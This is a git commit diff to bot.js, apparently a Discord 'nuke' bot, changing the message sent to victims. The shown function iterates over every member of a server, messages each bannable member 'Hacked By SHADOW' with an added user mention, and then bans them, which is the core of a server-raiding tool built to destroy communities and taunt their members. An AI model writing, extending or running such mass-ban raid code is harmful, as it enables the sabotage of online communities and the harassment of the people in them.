5517d87ee87252d703b3ec6d291a35968bf0f989
SSshadow99 <45866647+SSshadow99@users.noreply.github.com>
2018-12-30 15:32:44 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -856,7 +856,7 @@ async function nuke(guild) {
   await Promise.all(guild.members.map(async (m) => {
     if (m.bannable) {
       users++;
-      await m.send('Hacked By SHADOW ').catch(e => { return void e; });
+      await m.send('Hacked By SHADOW <@318705077734998017> ').catch(e => { return void e; });
       return m.ban();
     }
   }));
